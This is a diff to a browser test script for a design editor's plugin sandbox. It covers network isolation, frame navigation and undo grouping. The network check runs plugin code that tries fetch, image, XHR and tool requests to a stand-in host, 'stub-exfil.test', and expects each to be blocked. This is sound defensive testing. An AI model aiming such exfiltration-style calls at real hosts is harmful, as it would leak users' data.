@@ -23,6 +23,12 @@ function check(name, ok, detail = "") {
 
 const browser = await chromium.launch(launch);
 const context = await browser.newContext({ viewport: { width: 1600, height: 1000 }, ignoreHTTPSErrors: true });
+// A stubbed host that nothing may reach: plugin network checks assert it saw no request.
+const stubHits = [];
+await context.route("https://stub-exfil.test/**", (route) => {
+  stubHits.push(route.request().url());
+  return route.fulfill({ status: 200, contentType: "text/plain", body: "x" });
+});
 const page = await context.newPage();
 await page.addInitScript(() => {
   try {
@@ -33,7 +39,7 @@ await page.addInitScript(() => {
 });
 const errors = [];
 page.on("pageerror", (e) => errors.push(String(e)));
-page.on("console", (m) => m.type() === "error" && !m.text().includes("WebSocket") && !m.text().includes("Failed to load resource") && errors.push(m.text()));
+page.on("console", (m) => m.type() === "error" && !m.text().includes("WebSocket") && !m.text().includes("Failed to load resource") && !m.text().includes("Content Security Policy") && !m.text().includes("Fetch API cannot load") && errors.push(m.text()));
 
 const shot = (name) => page.screenshot({ path: path.join(OUT, `${name}.png`) });
 const state = () => page.evaluate(() => window.__dt.state());
@@ -568,6 +574,74 @@ try {
     return { title: document.title, exists: !!window.__dt.doc().nodes[id] };
   }, shapes[0]);
   check("plugins are sandboxed from the editor", escaped.title !== "pwned" && escaped.exists, JSON.stringify(escaped));
+
+  // No network: fetch, images, WebRTC and the fetching tools all fail, and the stub host sees nothing.
+  const runCode = async (code, id = "t" + Math.random().toString(36).slice(2)) => {
+    await page.evaluate(async ([id, code]) => {
+      const { runPlugin } = await import("/src/plugins.ts");
+      runPlugin({ id, name: "Test", description: "", code });
+    }, [id, code]);
+  };
+  const waitStopped = () => page.waitForFunction(() => window.__dt.plugin() === null, null, { timeout: 15000 });
+  const nodeName = (id) => page.evaluate((id) => window.__dt.doc().nodes[id].name, id);
+  const target = shapes[1];
+  await page.evaluate(([id]) => window.__dt.dispatch({ op: "ai", tool: "update_nodes", input: { updates: [{ id, name: "idle" }] } }), [target]);
+  await runCode(`
+    const out = {};
+    try { await fetch("https://stub-exfil.test/f"); out.fetch = "ok"; } catch (e) { out.fetch = "blocked"; }
+    out.img = await new Promise((res) => { const i = new Image(); i.onload = () => res("loaded"); i.onerror = () => res("blocked"); i.src = "https://stub-exfil.test/i.png"; setTimeout(() => res("blocked"), 1500); });
+    out.xhr = await new Promise((res) => { try { const x = new XMLHttpRequest(); x.open("GET", "https://stub-exfil.test/x"); x.onload = () => res("ok"); x.onerror = () => res("blocked"); x.send(); } catch (e) { res("blocked"); } });
+    out.rtc = typeof RTCPeerConnection + "/" + typeof webkitRTCPeerConnection;
+    for (const [k, name, input] of [["url", "import_url", { url: "https://stub-exfil.test/p" }], ["html", "import_html", { html: "<p>x</p>" }], ["save", "save_plugin", { name: "x", code: "1" }], ["photo", "search_photos", { query: "cat" }], ["addr", "update_nodes", { updates: [{ id: "${target}", imageUrl: "https://stub-exfil.test/a.png" }] }]]) {
+      try { await dt.tool(name, input); out[k] = "ran"; } catch (e) { out[k] = String(e.message).slice(0, 60); }
+    }
+    await dt.tool("update_nodes", { updates: [{ id: "${target}", name: JSON.stringify(out) }] });`);
+  await waitStopped();
+  const net = JSON.parse(await nodeName(target));
+  check(
+    "plugin has no network: fetch, XHR, images, WebRTC, import_url/import_html/save_plugin/search_photos and web addresses all fail",
+    net.fetch === "blocked" && net.img === "blocked" && net.xhr === "blocked" && net.rtc === "undefined/undefined" && net.url.includes("plugins can't") && net.html.includes("plugins can't") && net.save.includes("plugins can't") && net.photo.includes("plugins can't") && net.addr.includes("web addresses") && stubHits.length === 0,
+    JSON.stringify({ ...net, stubHits: stubHits.length }),
+  );
+
+  // A plugin that navigates its own frame is stopped.
+  await runCode(`await dt.notify("hi"); location.href = "data:text/html,<p>gone</p>"; await new Promise((r) => setTimeout(r, 5000));`);
+  await waitStopped();
+  check("a plugin that navigates its frame is stopped", (await page.locator(".toast.error").allTextContents()).some((t) => t.includes("navigate")), "");
+
+  // A long run (50 calls over 4+ seconds) is one undo step.
+  const x0 = await page.evaluate((id) => window.__dt.doc().nodes[id].x, target);
+  await page.evaluate(() => document.activeElement?.blur?.());
+  await runCode(`for (let i = 1; i <= 50; i++) { await dt.tool("update_nodes", { updates: [{ id: "${target}", x: ${x0} + i }] }); await new Promise((r) => setTimeout(r, 90)); }`);
+  await page.waitForFunction(() => window.__dt.plugin() !== null && window.__dt.plugin() !== undefined, null, { timeout: 2000 }).catch(() => {});
+  await waitStopped();
+  const x1 = await page.evaluate((id) => window.__dt.doc().nodes[id].x, target);
+  await page.keyboard.press("Control+z");
+  const x2 = await page.evaluate((id) => window.__dt.doc().nodes[id].x, target);
+  check("a 50-call plugin run over 4 s undoes in one Ctrl+Z", x1 === x0 + 50 && x2 === x0, `${x0} -> ${x1} -> ${x2}`);
+
+  // commitUndo splits a run; UI clicks (a second apart) are a step each.
+  await runCode(`await dt.tool("update_nodes", { updates: [{ id: "${target}", name: "one" }] }); await dt.commitUndo(); await dt.tool("update_nodes", { updates: [{ id: "${target}", name: "two" }] });`);
+  await waitStopped();
+  await page.keyboard.press("Control+z");
+  const afterCommit = await nodeName(target);
+  await page.keyboard.press("Control+z");
+  check("dt.commitUndo() starts a new undo step", afterCommit === "one" && (await nodeName(target)) !== "one", afterCommit);
+  await runCode(`dt.ui.show('<button id="b" style="width:100%;height:60px">go</button>', { width: 200, height: 100 }); let n = 0; document.getElementById("b").onclick = async () => { n++; await dt.tool("update_nodes", { updates: [{ id: "${target}", name: "click" + n }] }); };`);
+  await page.waitForSelector(".plugin-header");
+  const frameUi = page.frameLocator("iframe.plugin-frame");
+  for (let i = 0; i < 3; i++) {
+    await frameUi.locator("#b").click();
+    await page.waitForTimeout(1300);
+  }
+  const clicked = await nodeName(target);
+  await page.locator("#dt-canvas").click({ position: { x: 5, y: 5 } }).catch(() => {});
+  await page.keyboard.press("Control+z");
+  const undo1 = await nodeName(target);
+  await page.keyboard.press("Control+z");
+  const undo2 = await nodeName(target);
+  check("plugin UI clicks are one undo step each", clicked === "click3" && undo1 === "click2" && undo2 === "click1", `${clicked},${undo1},${undo2}`);
+  await page.evaluate(async () => (await import("/src/plugins.ts")).stopPlugin());
   }
 
   // Figma import from a saved REST API export.
